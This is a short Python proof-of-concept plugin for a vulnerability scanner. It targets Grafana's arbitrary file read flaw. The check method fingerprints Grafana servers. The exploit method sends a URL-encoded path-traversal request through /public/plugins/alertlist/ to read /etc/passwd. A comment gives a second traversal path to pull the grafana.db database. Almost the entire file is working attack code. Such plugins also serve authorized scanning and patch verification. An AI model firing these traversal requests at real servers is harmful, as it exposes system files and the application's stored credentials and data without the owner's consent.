from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.medium
        self.detail = """<https://cloud.tencent.com/developer/article/1922065>
        
读取grafana数据库：/public/plugins/alertlist/../../../../../../../../../../../../var/lib/grafana/grafana.db"""
        self.name = "Grafana任意文件读取漏洞"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "window.grafanaBootData" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        url = urljoin(self.target, "/../../../../../../../../../../../../") + "public/plugins/alertlist/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E/etc/passwd"
        client = Http()
        client.url = url
        resp = client.get()
        if "/root" in resp.text:
            return True
        else:
            return False
